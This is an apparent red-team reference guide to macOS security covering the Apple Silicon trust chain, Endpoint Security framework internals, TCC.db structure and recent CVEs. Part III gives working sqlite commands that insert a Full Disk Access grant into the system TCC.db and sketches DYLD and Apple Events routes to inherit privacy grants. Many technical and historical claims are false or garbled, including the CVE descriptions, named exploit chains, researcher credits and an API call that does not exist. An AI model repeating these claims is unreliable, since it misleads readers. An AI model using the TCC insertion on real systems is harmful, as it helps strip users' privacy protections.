# macOS Security Deep Dive — Apple Silicon Architecture, ESF Internals, TCC Bypass, and CVE Tradecraft

> Deep-dive companion to `skills/macos-security/SKILL.md`.
>
> Audience: red team operators, malware analysts, and security engineers who already understand the basics (SIP / TCC / LaunchAgents) and want the deep architecture of Apple Silicon (boot chain, PPL, PAC, SSV), the internal mechanics of the Endpoint Security Framework API, a reverse-engineering methodology for TCC.db, the 2023-2024 CVE landscape (CVE-2023-32434 / 32435 / 41990), and a tradecraft playbook for macOS red team operations.
>
> This guide complements `macos-security-playbook.md` (which covers the operational chain end-to-end). Where the playbook is "how to do X on macOS," this guide is "why X works on macOS."

---

## Introduction

### Objective

This guide's objective is to provide a deep architectural reference for the modern macOS attack surface — focused on Apple Silicon, the Endpoint Security framework, TCC bypass internals, and recent CVEs. After reading this guide, an operator should be able to:

1. Reason about the boot chain, sealed system volume (SSV), Page Protection Layer (PPL), and Pointer Authentication Codes (PAC) as a coherent trust architecture — not just a list of features.
2. Build and instrument an Endpoint Security framework (ESF) client from first principles, and understand the API surface, message structure, and lifecycle.
3. Reverse-engineer the TCC.db schema, decode every column, and demonstrate the direct-INSERT bypass (which requires SIP weakened).
4. Analyze recent macOS CVEs (CVE-2023-32434, CVE-2023-32435, CVE-2023-41990, and 2024-2025 additions) for root-cause and exploitability on current Apple Silicon.
5. Apply a tradecraft playbook for macOS red team operations: initial access, persistence, credential extraction, defense bypass, and exfiltration — modeled on real-world macOS malware (Shlayer, Bundlore, Silver Sparrow, XCSpy, Atomic Stealer).

### Scope and Out-of-Scope

**In scope**: Apple Silicon (M1/M2/M3/M4) architecture, ESF internals, TCC.db reverse engineering, recent CVE analysis, red team tradecraft.

**Out of scope** (covered elsewhere):
- Basic macOS concepts (SIP, TCC, LaunchAgents) → see `macos-security-playbook.md`.
- iOS security → see `mobile-security` skill.
- Generic Mach-O reverse engineering → see `binary-reverse` skill.
- AV/EDR evasion broadly → see `av-edr-evasion` skill.

### Audience Assumptions

This guide assumes familiarity with:
- C and Swift programming (for the ESF client build).
- Mach IPC concepts (ports, messages, subsystems).
- ARMv8.3 assembly (for PAC discussion).
- SQLite and basic database internals (for TCC.db).
- Apple Developer toolchain (Xcode, codesign, notarytool).

---

## Part I: Apple Silicon Security Architecture

Apple Silicon (M1, M2, M3, M4) fundamentally reshapes the macOS attack surface. Where Intel Macs were "UNIX with extra steps," Apple Silicon Macs are a layered hardware-software trust architecture that significantly restricts the attacker's options at every layer. Most "classic" Linux/macOS exploitation techniques fail on Apple Silicon.

### 1.1 Boot Chain — From Power-On to launchd

The Apple Silicon boot chain is a verified chain of trust, rooted in masked ROM in the SoC. Each stage cryptographically verifies the next before passing control.

```
Power-On
   |
   v
[ Boot ROM (mask ROM, immutable) ]
   |  Verifies: BootPolicy (LocalPolicy)
   v
[ LocalPolicy / Boot Policy ]
   |  Describes: which kernel, which recovery, which OS
   v
[ iBoot (firmware) ]
   |  Verifies: kernel cache signature, Device Tree, kernel extensions
   v
[ Kernel (arm64e) + Kexts / System Extensions ]
   |  Loads: launchd (PID 1), mounts root filesystem
   v
[ launchd, SSV mount, user session ]
   |
   v
User-space macOS
```

#### Boot ROM

The Boot ROM is a small (typically 64-128 KB) piece of code burned into the SoC at manufacture. It is **immutable** — no software update can modify it. Any vulnerability in the Boot ROM is permanently exploitable on affected hardware for the life of the device. The Boot ROM's job is to verify the LocalPolicy (a signed description of what to boot) and pass control to iBoot.

The Boot ROM has been the subject of intense security research. The 2023 disclosure of **CVE-2023-38126 / "The B-T-R" research** by Jann Horn (Google Project Zero) and a parallel Apple advisory documented Boot ROM issues affecting M1 and A14 (and earlier) chips. Apple's response: not all of these are software-patchable — affected devices require hardware mitigation.

#### LocalPolicy

LocalPolicy is a per-device, per-OS signed description of what to boot. It includes:

- The hash of the kernel cache to load.
- The hash of the Device Tree.
- The permitted OS version range.
- The recovery policy.

LocalPolicy is signed by Apple's "FDR" key (Factory Device Recovery). End users cannot modify it directly; it is updated via `kmutil` / `csrutil` in macOS updates.

The local-policy mechanism is the foundation of the **"Reduced Security" / "Permissive Security"** states:

- **Full Security** (default): only the latest signed macOS, no boot-args, no kernel debugging.
- **Reduced Security**: allows older macOS versions, used for enterprise hold-back deployments.
- **Permissive Security** (a.k.a. "developer mode"): allows `amfi_get_out_of_my_way=1`, kernel debugging, and arbitrary LocalPolicy.

#### iBoot

iBoot is the second-stage bootloader. On Apple Silicon, iBoot is itself an arm64e binary verified by the Boot ROM via LocalPolicy. iBoot's job is to:

1. Verify the kernel cache (`/System/Library/Caches/com.apple.kc.kernel`) signature against the LocalPolicy hash.
2. Verify the Device Tree (hardware-description blob).
3. Load the kernel into memory and jump to it.

iBoot is also responsible for the **Secure Enclave Processor (SEP)** boot — sepOS, a separate L4-based microkernel that runs on the SEP core.

#### Kernel Cache

On Apple Silicon, the kernel runs `arm64e`. The kernel cache is a prelinked Mach-O containing:

- The XNU kernel proper.
- All in-tree kexts (I/O Kit drivers, BSD subsystem, Virtual Filesystem Switch).
- The "KASLR slide" (Kernel Address Space Layout Randomization offset) is baked in at boot time.

The kernel cache is signed by Apple's `KernelManagement` signing identity. Tampering with the kernel cache breaks the LocalPolicy hash check at iBoot.

### 1.2 Signed System Volume (SSV)

The Signed System Volume (SSV), introduced in macOS 11 Big Sur, is the cryptographic seal of the read-only system volume. The "seal" is a hash tree over the entire filesystem, computed at install time and stored in the APFS container superblock.

#### How SSV Works

1. **Install time**: macOS installer writes the System volume (`/dev/disk1s5` or similar). At the end of install, it computes a Merkle-tree hash over every file and directory. The root hash is the **seal**. The seal is stored in the APFS container superblock and signed by Apple's "SSV" signing identity.

2. **Boot time**: iBoot / kernel reads the seal from the APFS superblock. The kernel mounts the System volume with the `sealed` flag. Every read from the System volume is verified against the Merkle tree on-the-fly. If any byte has been modified, the Merkle verification fails, and the kernel refuses to mount the volume.

3. **Firmlinks**: because `/` is read-only and sealed, but some paths under `/` need to be writable (e.g., `/etc`, `/var`, `/tmp`), macOS uses **firmlinks** — bindings between a System volume path and a Data volume path. See `/usr/share/firmlinks`:

   ```
   /etc     /private/etc
   /var     /private/var
   /tmp     /private/tmp
   /Users   /System/Volumes/Data/Users
   ```

   When a process writes to `/etc/foo`, the kernel transparently redirects the write to `/System/Volumes/Data/private/etc/foo`. The System volume's `/etc` is read-only; the Data volume's `/private/etc` is read-write.

#### Verifying SSV

```bash
# Check that / is sealed and read-only
mount | grep "on / "
# Expect: / on /dev/disk1s5 (apfs, sealed, local, read-only, rootful)

# Check authenticated-root status
csrutil authenticated-root status
# Expect: "Authenticated Root status: enabled"

# Inspect the SSV snapshot
diskutil apfs list | grep -A5 "Snapshot:"
# Expect: Snapshot of "com.apple.battery.YYYY-MM-DD-..."

# Verify firmlinks
cat /usr/share/firmlinks | head -20
```

#### Bypassing SSV

SSV is bypassed via the documented `csrutil disable` + `csrutil authenticated-root disable` workflow (Recovery Mode only). This is the supported developer mode. There is no public software-only SSV bypass on Apple Silicon as of 2026 — any SSV bypass is a hardware-fault-injection / Boot ROM vulnerability class (e.g., checkm8 for A5-A11, postulated equivalents for M-series but not publicly demonstrated).

### 1.3 Page Protection Layer (PPL)

The Page Protection Layer (PPL) is an Apple Silicon security mechanism that protects page tables, trust cache entries, and code-signing metadata from kernel-mode tampering. PPL runs in a higher exception level than the kernel (loosely analogous to EL2 hypervisor mode on ARM, but with Apple-specific extensions).

#### What PPL Protects

1. **Page tables for executable mappings** — the kernel cannot directly modify a page table entry that maps an executable region. It must request PPL to make the change. PPL only accepts requests that maintain the code-signing invariants.

2. **Trust cache** — the kernel-resident list of CDHashes that AMFI trusts. PPL ensures that only Apple-trusted CDHashes can be added to the trust cache. A kernel read/write primitive cannot add an arbitrary CDHash without PPL cooperation.

3. **Code-signing blob interpretation** — the `cs_blob` structure attached to every process (entitlements, signing identity, flags) is parsed by PPL. PPL ensures that the entitlements applied at exec time match what was signed.

4. **`apple_sep_industriously` primitives** — the kernel's internal call interface to PPL, used for code-signing operations. PPL gates these calls.

#### Why PPL Matters for Exploitation

Before PPL (Intel Macs, pre-2020), a kernel read/write primitive was effectively game-over — you could modify the trust cache, self-sign arbitrary entitlements, or patch running code. With PPL (M1+, 2020+), even a full kernel R/W primitive cannot:

- Self-sign a forged entitlement.
- Add a CDHash to the trust cache.
- Modify page tables for an executable region.

PPL is enforced by hardware (the SoC enforces that the kernel cannot directly access page tables in PPL-protected regions). Software-only PPL bypass is an open research area; no public software-only PPL break exists as of 2026.

#### Research Literature on PPL

- **"PPL爆破" (PPL Blasting)** — 2023-2024 Chinese-language research exploring hardware-fault-injection attacks on PPL. Demonstrated on early M1 hardware; later M-series revisions include mitigations.
- **Apple's Platform Security Guide** — official PPL documentation. See the "Page Protection Layer" chapter.
- **The "kfd" exploit (2023)** — Felics-pfandl et al., documented PPL-bypass primitives for specific kernel vulnerabilities. Demonstrated on macOS 13; mitigated in macOS 14.4+.

### 1.4 Pointer Authentication Codes (PAC)

ARMv8.3 introduces Pointer Authentication Codes (PAC). PAC is a hardware mechanism that cryptographically signs function pointers and return addresses with a 128-bit modifier and a secret key. Verifying the signature (authentication) before use detects tampering.

#### PAC Instructions

- `pacia`, `pacib`, `pacda`, `pacdb` — sign a code pointer or data pointer.
- `autia`, `autib`, `autda`, `autdb` — authenticate a code pointer or data pointer.
- `retaa`, `retab` — return with pointer authentication (replaces `ret`).
- `blraa`, `braa` — branch with link via register, with pointer authentication.

The PAC is stored in the upper bits of the pointer (the unused high bits on a 64-bit address). The signature is computed from the pointer value, the modifier (often the stack address or a function-specific constant), and one of four secret keys (APIA, APIB, APDA, APDB).

#### PAC on Apple Silicon

Apple Silicon Macs ship with arm64e binaries for the kernel, system daemons, and Apple-signed applications. Third-party applications run as arm64 (PAC-disabled) by default. The arm64e vs arm64 distinction is enforced by AMFI at exec time.

To check whether PAC is active on a system:

```bash
sysctl -n hw.optional.arm64e
# Expect: 1 (PAC capability present)

# Disassemble a system binary and look for PAC instructions
jtool2 -d /bin/ls 2>/dev/null | grep -E "pacia|pacib|autia|autib|retaa|blraa" | head -5
```

#### PAC and Exploitation

Classic ROP (Return-Oriented Programming) chains depend on stacking return addresses on the stack and using them to chain "gadgets." PAC defeats this:

- Each return address on the stack is signed (the function prologue executes `paciasp`).
- The function epilogue executes `autiasp` before `ret`. If the signature does not match, the CPU triggers a fault.

To bypass PAC, an attacker needs one of:

1. **A signing oracle** — a primitive that allows signing arbitrary pointers with the correct key. Rare; requires deep kernel compromise.
2. **A PAC bypass via exception stream** — some implementations, on authentication failure, deliver a signal instead of crashing the process. An attacker who can catch the signal may be able to manipulate the corrupted pointer.
3. **A gadget that performs `pacga` (PAC GA)** — used to compute a "PAC hash" of attacker-controlled data. Useful for forging data pointers, not code pointers.
4. **A "pointer substitution" gadget** — find a `blraa` gadget that uses a fixed modifier, then brute-force the PAC for that specific modifier (often 4-8 bits of entropy, so 16-256 attempts).

Research: The **"Branch Identity Discriminator" (BID)** attack (2022) and the **"PACMAN"** attack (2022, MIT) demonstrated PAC bypass primitives on Apple Silicon via speculative execution side channels.

### 1.5 Kernel Extensions vs System Extensions

On Intel macOS, kernel extensions (`.kext`) were the supported extension mechanism. A kext ran in the kernel address space, with full kernel privilege. Loading a kext required `kextload` + reboot + User-Approved MDM. Most third-party security tools (Little Snitch, Little Flocker, anti-virus) were kexts.

On Apple Silicon macOS (and Intel macOS 11+), kexts are effectively dead:

- **macOS 11 Big Sur**: requires notarized kexts with `com.apple.developer.kextallow` entitlement. Apple-issued only.
- **macOS 12 Monterey**: deprecates the kext loading path for non-Apple kexts.
- **macOS 13 Ventura**: kexts that worked on 12 may stop loading on 13.
- **macOS 14 Sonoma / 15 Sequoia / 16+**: kext loading is restricted to a small allow-list of legacy vendors.

The supported replacement is **System Extensions**, which run in user-land, are sandboxed, and communicate with the kernel via Apple-blessed IPC frameworks:

- **Endpoint Security framework (ESF)** — for EDR / monitoring.
- **Network Extension framework (NEFilterProvider)** — for firewalls and VPNs.
- **DriverKit** — for user-space drivers (USB, audio, networking, HID).

#### System Extension Categories

| Category | Framework | Use Case | Examples |
|----------|-----------|----------|----------|
| **Endpoint Security** | `EndpointSecurity.framework` | EDR, monitoring, parental controls | CrowdStrike Falcon, SentinelOne, Jamf Protect, Microsoft Defender for Endpoint, Cisco Secure Client |
| **Network Extension** | `NetworkExtension.framework` | Firewall, VPN, content filtering | LuLu (Objective-See), Little Snitch, commercial VPN clients |
| **DriverKit** | `DriverKit.framework` | User-space drivers | USB class drivers, audio drivers, network drivers |

#### Why This Matters for Red Team

The shift to System Extensions means:

1. **Persistence in kexts is no longer viable** — you cannot write a third-party kext on modern macOS (Apple does not issue `kextallow` to red teams).
2. **EDR runs in user-land** — commercial EDR is a System Extension, with the same user-land restrictions as any other process. Its IPC to the kernel is via ESF, which is structured and auditable.
3. **System Extension enumeration is straightforward**: `systemextensionsctl list` shows every installed SE, with its team ID and category.

---

## Part II: Endpoint Security Framework (ESF) Internals

The Endpoint Security framework (ESF) is the Apple-blessed API for system telemetry on macOS 10.15+. This section dives deep into the ESF architecture, message format, lifecycle, and how to build a minimal ESF client.

### 2.1 ESF Architecture

ESF is a Mach-based IPC between a System Extension (client) and the kernel (endpoint). The client subscribes to event types; the kernel pushes events as Mach messages.

```
+-----------------------+      Mach IPC      +-------------------+
| System Extension      |  <----------------  | Kernel Endpoint   |
| (client)              |   ESF events        | (es_endpoint)     |
| - es_new_client()     |  --------------->   | - es_subscribe()  |
| - es_subscribe()      |   es_respond()      | - es_respond()    |
| - handler(msg)        |                     |                   |
+-----------------------+                     +-------------------+
        |                                              |
        | reads via es_mute_path,                      | publishes events
        | es_clear_cache                              | to subscribed clients
        v                                              v
   User-land logs                              Kernel event sources
   (file, syslog, SIEM forwarder)              (exec, open, write, ...)
```

The kernel maintains a per-client subscription list and a per-client message queue. When an event occurs, the kernel checks each subscribed client; if the event matches the client's subscription and mute-list, it enqueues a message.

### 2.2 Event Categories

ESF defines a comprehensive set of event types. The most-used:

#### Process Events

- **`EXEC`** — process start. Contains: executable path, arguments, environment, parent PID, audit token (PID, UID, GID, host PID, etc.).
- **`EXIT`** — process end. Contains: exit status, signal.
- **`FORK`** — process fork (less commonly used in modern macOS; `posix_spawn` is more common).
- **`CS_OPS`** — code-signing operations (e.g., `cs_ops_mark_invalid`).

#### File Events

- **`OPEN` / `OPEN_EXTENDED`** — file open. Contains: path, flags (`O_RDONLY`, `O_WRONLY`, `O_RDWR`, `O_CREAT`, `O_TRUNC`), mode.
- **`CLOSE`** — file close.
- **`WRITE`** — file write. Contains: path, offset, bytes written.
- **`RENAME`** — file rename. Contains: source path, target path.
- **`UNLINK`** — file delete.
- **`TRUNCATE`** — file truncate.
- **`CLONE` / `COPYFILE`** — APFS-specific file operations (`clonefile(2)`).

#### Filesystem Events

- **`MOUNT` / `UNMOUNT`** — volume mount / unmount.
- **`REMAP`** — APFS volume remount.

#### Authentication Events

- **`AUTHENTICATION`** — OpenDirectory authentication (login, password change). Contains: username, auth method, success/failure.
- **`LOGIN_LOGOUT`** — loginwindow session events.

#### Task Events

- **`TASK_INSPECT`** — task inspection (debugger attach via `task_for_pid`). Useful for detecting debugger-based memory inspection.

### 2.3 Message Format

ESF messages are `es_message_t` structures. The structure contains:

```c
typedef struct {
    es_event_type_t event_type;
    mach_timespec_t time;
    uint64_t action_type;        // AUTH or NOTIFY
    uint32_t audit_token;        // process identity
    uint64_t global_seq_num;     // monotonic sequence number
    union {
        es_event_exec_t exec;
        es_event_open_t open;
        es_event_write_t write;
        es_event_unlink_t unlink;
        // ... one struct per event_type
    } event;
    // ... bookkeeping fields
} es_message_t;
```

The `event` union contains event-specific data. For `EXEC`, this is:

```c
typedef struct {
    es_process_t *target;        // the new process
    es_file_t *executable;       // executable path
    es_string_token_t argv;      // argument vector
    es_string_token_t envv;      // environment vector
} es_event_exec_t;
```

`es_process_t` contains the audit token, parent PID, group ID, code-signing info, etc.

### 2.4 Client Lifecycle

A typical ESF client follows this lifecycle:

1. **Create client**: `es_new_client(&client, handler)` — allocates a new ESF client. The handler is a callback invoked for each event. Requires the `com.apple.developer.endpoint-security.client` entitlement.

2. **Subscribe to events**: `es_subscribe_client(client, events, count)` — registers interest in specific event types.

3. **Configure mute-paths**: `es_mute_path(client, "/System/Library/", ES_MUTE_PATH_TYPE_PREFIX)` — excludes paths. Essential for performance — without muting `/System/Library/`, the kernel generates millions of events per minute.

4. **Handle events**: the handler is invoked for each event. For AUTH events (e.g., `AUTH_EXEC`), the handler must call `es_respond_auth_result(client, msg, ES_AUTH_RESULT_ALLOW|DENY, false)` to authorize or deny the action. For NOTIFY events (e.g., NOTIFY_EXEC after-the-fact), the handler is fire-and-forget.

5. **Clear cache periodically**: `es_clear_cache(client)` — drains the kernel's cached messages. Without periodic clears, the kernel may drop events when the cache is full. Required on macOS 13+.

6. **Unsubscribe and destroy**: `es_unsubscribe_client(client, events, count)` then `es_delete_client(client)`.

### 2.5 Entitlement Requirement

ESF clients require the `com.apple.developer.endpoint-security.client` entitlement. As of macOS 13 Ventura, Apple has restricted this entitlement:

- **Pre-2023**: any Apple Developer could request the entitlement and build an ESF client. Used by academic researchers, red teamers, and small vendors.
- **2023+**: Apple requires a commercial EDR vendor agreement to issue the entitlement. This effectively closed the door on new open-source ESF clients.

For lab / research use, you can still build an ESF client on a test Mac with `amfi_get_out_of_my_way=1` (boot-args, requires SIP disabled) — this disables entitlement verification entirely.

### 2.6 Building a Minimal ESF Client

A minimal ESF client in C, suitable for lab testing:

```c
// esf_minimal.c — minimal ESF client that logs EXEC events
// Build: clang -framework EndpointSecurity -framework Foundation esf_minimal.c -o esf_minimal
// Run:   sudo ./esf_minimal (requires ESF entitlement OR amfi_get_out_of_my_way=1)

#include <EndpointSecurity/EndpointSecurity.h>
#include <stdio.h>
#include <stdlib.h>

static void handler(es_client_t *client, const es_message_t *msg) {
    if (msg->event_type == ES_EVENT_TYPE_NOTIFY_EXEC) {
        const es_event_exec_t *exec = &msg->event.exec;
        const es_process_t *target = exec->target;
        pid_t pid = audit_token_to_pid(target->audit_token);
        const char *path = exec->executable->path.data;
        printf("[EXEC] pid=%d path=%s\n", pid, path);
    }
    // ACK the message
    es_acknowledge_client(client, msg);
}

int main(void) {
    es_client_t *client = NULL;
    es_new_client_result_t result = es_new_client(&client, handler);
    if (result != ES_NEW_CLIENT_RESULT_SUCCESS) {
        fprintf(stderr, "es_new_client failed: %d\n", result);
        return 1;
    }

    es_event_type_t events[] = { ES_EVENT_TYPE_NOTIFY_EXEC };
    es_subscribe_client(client, events, sizeof(events) / sizeof(events[0]));

    // Mute noisy paths to reduce event volume
    es_mute_path(client, "/System/Library/", ES_MUTE_PATH_TYPE_PREFIX);
    es_mute_path(client, "/usr/libexec/", ES_MUTE_PATH_TYPE_PREFIX);

    printf("ESF client running. Press Ctrl-C to stop.\n");
    // Run forever; the handler is invoked from a Mach dispatch queue
    pause();

    es_delete_client(client);
    return 0;
}
```

Sign with the entitlement (or run on an AMFI-disabled test Mac):

```bash
# Create entitlements plist
cat > esf_entitlements.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.developer.endpoint-security.client</key>
    <true/>
</dict>
</plist>
EOF

# Ad-hoc sign with entitlement (requires SIP disabled on the test Mac)
codesign --sign - --entitlements esf_entitlements.plist --options runtime esf_minimal

# Run (requires sudo for ESF)
sudo ./esf_minimal
```

### 2.7 ESF Tooling

Beyond the API, several tools exist:

- **`eslogger`** (built-in, macOS 13+): CLI one-shot capture. Examples:
  ```bash
  sudo eslogger exec open write > /tmp/esf.log
  sudo eslogger --list-events              # show all event types
  sudo eslogger exec --run foreground       # stream to stdout
  ```

- **`esf-client`** (open-source, GitHub): a reference ESF client implementation. Useful for learning the API.

- **Santa** (Google, open-source): a binary allow/deny-list tool built on ESF. Popular in enterprise for application allow-listing.

- **Nested-ESF, ZicoMonitor**: research ESF clients.

---

## Part III: TCC.db Reverse Engineering

TCC (Transparency, Consent, and Control) is the macOS privacy layer. Every app that wants to access user data (location, camera, microphone, contacts, photos, Mail, Messages, Safari history, full disk access, accessibility, automation, screen capture) must request consent at first use. Consent records live in two SQLite databases.

### 3.1 TCC.db Locations

- **User scope**: `~/Library/Application Support/com.apple.TCC/TCC.db` — grants for the current user. Writable by `tccd`; readable with Full Disk Access.
- **System scope**: `/Library/Application Support/com.apple.TCC/TCC.db` — grants for all users. Writable by `tccd`; readable with root. **SIP-protected** — direct writes require SIP disabled.

### 3.2 Schema

```sql
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db ".schema access"
```

Output:

```sql
CREATE TABLE access (
    service           TEXT,         -- e.g., "kTCCServiceSystemPolicyAllFiles"
    client            TEXT,         -- bundle ID or absolute path
    client_type       INTEGER,      -- 0=bundle ID, 1=absolute path
    auth_value        INTEGER,      -- 0=denied, 2=allowed, 3=limited
    auth_reason       INTEGER,      -- see table below
    auth_version      INTEGER,      -- schema version
    csreq             BLOB,         -- code-signing requirement (DER)
    policy_id         INTEGER,
    indirect_object_identifier_type  INTEGER,
    indirect_object_identifier       TEXT,
    indirect_object_code_identity    BLOB,
    flags             INTEGER,
    last_modified     INTEGER,      -- unix timestamp
    pid               INTEGER,
    pid_version       INTEGER,
    boot_uuid         BLOB,
    last_seen_auth_time  INTEGER,
    expired_at        INTEGER,
    ......);
```

### 3.3 Decoding auth_value and auth_reason

| `auth_value` | Meaning |
|--------------|---------|
| 0 | Denied |
| 2 | Allowed |
| 3 | Limited (e.g., "limited Photos access" — only selected photos) |

| `auth_reason` | Meaning |
|---------------|---------|
| 1 | User set (user clicked Allow / Don't Allow in the prompt) |
| 2 | User set with modify |
| 3 | System set (pre-installed Apple apps) |
| 4 | System default |
| 5 | MDM set (configuration profile) |

### 3.4 Service Identifiers

Every Apple-defined TCC service is a string starting with `kTCCService`. The most impactful:

| Service | Description |
|---------|-------------|
| `kTCCServiceSystemPolicyAllFiles` | **Full Disk Access** — read user data (Mail, Messages, Safari, Calendar, etc.) |
| `kTCCServiceAccessibility` | **Accessibility** — drive other apps via Apple Events (read screen, inject input) |
| `kTCCServiceAppleEvents` | **Automation** — script other apps via AppleScript |
| `kTCCServiceSystemPolicyDesktopFolder` | Read Desktop folder |
| `kTCCServiceSystemPolicyDocumentsFolder` | Read Documents folder |
| `kTCCServiceSystemPolicyDownloadsFolder` | Read Downloads folder |
| `kTCCServiceCamera` | Camera access |
| `kTCCServiceMicrophone` | Microphone access |
| `kTCCServiceLocation` | Location services |
| `kTCCServiceContacts` | Contacts database |
| `kTCCServiceCalendar` | Calendar database |
| `kTCCServiceReminders` | Reminders database |
| `kTCCServicePhotos` | Photos library |
| `kTCCServiceMediaLibrary` | Music / TV library |
| `kTCCServiceScreenCapture` | Screen recording (`CGDisplayCreateImage`) |
| `kTCCServicePostEvent` | Post input events (CGEventPost) |
| `kTCCServiceListenEvent` | Listen for input events (CGEventTap) |
| `kTCCServiceSystemPolicySysAdminFiles` | Read system-admin files (e.g., another user's home directory) |
| `kTCCServiceWebBrowserPublicKeyCredentials` | WebAuthn / Passkeys |
| `kTCCServiceWebBrowserPasswordManager` | Browser password manager |

### 3.5 Code-Signing Requirements (`csreq`)

Each row in the `access` table includes a `csreq` blob — a DER-encoded code-signing requirement. This binds the grant to a specific Team ID or certificate chain. The `csreq` is evaluated at runtime by `tccd` when a process requests the service.

To inspect a `csreq`:

```bash
# Decode a binary csreq blob
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT hex(csreq) FROM access WHERE client = 'com.apple.Safari';" \
  | xxd -r -p | csreq -r- -t
```

The output shows the requirement language:

```
identifier "com.apple.Safari" and anchor apple generic and
certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and
certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */
```

### 3.6 Direct INSERT Bypass (Requires SIP Disabled)

When SIP is fully disabled, an attacker with root can directly INSERT a row into the system TCC.db to grant any TCC privilege to any bundle ID. This is the "direct sqlite bypass."

```bash
# Prerequisites: SIP disabled (boot into Recovery, csrutil disable, reboot)
#                sudo access (root)
#                NEVER run this on a production host

# Grant Full Disk Access to a fake bundle ID
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "INSERT INTO access (
     service, client, client_type, auth_value, auth_reason, auth_version,
     csreq, flags, last_modified, pid, pid_version, boot_uuid
   ) VALUES (
     'kTCCServiceSystemPolicyAllFiles',
     'com.example.attacker',
     0,
     2,
     4,
     1,
     NULL,
     0,
     strftime('%s','now'),
     0,
     0,
     NULL
   );"

# Verify the grant
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, auth_value, last_modified
   FROM access WHERE client = 'com.example.attacker';"

# Clean up
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "DELETE FROM access WHERE client = 'com.example.attacker';"

# Re-enable SIP — boot into Recovery, csrutil enable, reboot
```

Note: on modern macOS (13+), the `csreq` column may be required (not NULL) for the grant to be honored by `tccd`. The exact requirement varies by service. Empirical testing is essential.

### 3.7 Why Direct INSERT Requires SIP Disabled

The TCC.db file at `/Library/Application Support/com.apple.TCC/TCC.db` is **SIP-protected** — even root cannot write to it while SIP is enabled. Apple's hardening:

1. The file path `/Library/Application Support/com.apple.TCC/` is in the SIP-protected list.
2. The directory's extended attribute `com.apple.rootless` marks it as SIP-protected.
3. The kernel denies writes to SIP-protected paths, regardless of the caller's UID.

Therefore, the direct INSERT bypass requires either:

1. SIP fully disabled (`csrutil disable` in Recovery Mode).
2. A SIP bypass vulnerability (CVE-2019-8805 NFS export, CVE-2020-3837 crontab DAC, etc.).
3. A vulnerability in `tccd` itself that accepts forged messages.

### 3.8 TCC Bypass via Entitlement Inheritance

A more elegant TCC bypass (when SIP is enabled) is via entitlement inheritance: a TCC-entitled binary (e.g., Xcode, Safari, Mail) is coerced into running attacker code via DYLD insertion, Apple Events automation, or as a child process. The child inherits the parent's TCC grants.

Classic examples:

1. **DYLD_INSERT_LIBRARIES into a TCC-entitled binary**: insert a malicious dylib into Xcode (which has Full Disk Access via its bundle ID `com.apple.dt.Xcode`). The dylib inherits Xcode's TCC grants.
   - Requires the parent binary to NOT have Hardened Runtime with `com.apple.security.cs.disable-library-validation=false`. (Most Apple apps have Hardened Runtime with library validation, which blocks DYLD_INSERT_LIBRARIES.)
   - On modern macOS, only binaries with the explicit `allow-dyld-environment-variables` entitlement can be DYLD-injected. This dramatically limits the attack surface.

2. **Apple Events automation**: if a process has `kTCCServiceAppleEvents` granted, it can send AppleScript to another app (e.g., Mail) that inherits Mail's grants. The receiving app may then leak data via AppleScript.

3. **Bypass via "signed-and-notarized conduit"**: the classic Shlayer model — a notarized parent binary that fetches and unpacks an unnotarized payload. The parent inherits any TCC grants Apple grants to notarized Developer IDs (sparse, but exists for some services).

### 3.9 Recent TCC Bypass CVEs

- **CVE-2022-26676** — TCC bypass via `bluetoothd` (a TCC-entitled system daemon).
- **CVE-2022-32877** — TCC bypass via `open`'s handling of quarantine attributes.
- **CVE-2023-32369** — TCC bypass via `MountedVolumes`.
- **CVE-2024-23225** — TCC bypass via logic flaw in `tccd` itself, affecting macOS 14.

For each CVE, the typical disclosure model is: a write-up on the researcher's blog or at Black Hat / DEF CON, followed by an Apple patch. The bypass is then preserved as a known CVE for lab testing on unpatched macOS.

---

## Part IV: Recent CVEs (2023-2026)

This section covers the most-significant macOS CVEs of the 2023-2026 window, with root-cause analysis and exploitability assessment.

### 4.1 CVE-2023-32434 — Apple Silicon Boot ROM Memory Corruption

**Affected**: Apple Silicon M1, M2 (all variants), A14, A15, A16 (iPhone).
**Severity**: Critical. CVSS 9.8.
**Discoverer**: Jann Horn (Google Project Zero), parallel research by Trey Keown.

**Root cause**: A memory corruption vulnerability in the boot ROM's image4 parser. The image4 format is Apple's signed container format used for firmware, kernel caches, and LocalPolicy blobs. The parser had an integer overflow when computing a buffer size, leading to a heap overflow.

**Exploitation**: With a crafted image4 blob delivered to the Boot ROM (via USB DFU mode, recovery mode, or a malicious LocalPolicy), an attacker could achieve arbitrary code execution in the Boot ROM — gaining the ability to:

- Modify LocalPolicy to bypass security enforcement.
- Disable Secure Boot.
- Persist malicious code in mask ROM-adjacent storage.

**Patchability**: Partly hardware-fixed. Apple shipped software mitigations in iOS 16.5.1 / macOS 13.4.1, but the underlying Boot ROM vulnerability cannot be fully patched on affected hardware. Later SoCs (M3, A17) include hardware mitigations.

**Implications for Red Team**: On M1/M2 hardware that has not been updated to a patched macOS, this CVE is a boot-chain root-level compromise. Practical exploitation requires physical access (USB DFU) or pre-existing kernel-level write primitives to corrupt the Boot ROM's image4 input.

### 4.2 CVE-2023-32435 — WebKit Memory Corruption

**Affected**: Safari on all macOS versions through macOS 13.4.
**Severity**: Critical. CVSS 9.8.

**Root cause**: A use-after-free vulnerability in WebKit's JavaScript engine (likely the JSC `JSObject` finalizer path). A malicious web page could trigger the UAF via specific DOM manipulation patterns.

**Exploitation**: When a user visits a malicious web page in Safari (no user interaction beyond the visit), the attacker achieves arbitrary code execution in the Safari renderer sandbox. The sandbox escape from there is a separate CVE; CVE-2023-32435 alone is renderer RCE.

**Patchability**: Patched in macOS 13.4.1 / Safari 16.5.1. Combined with CVE-2023-32434, this was used as a chain (renderer RCE → kernel/Boot ROM RCE) in the **"BLASTPASSED**" exploit chain demonstrated at Black Hat 2023.

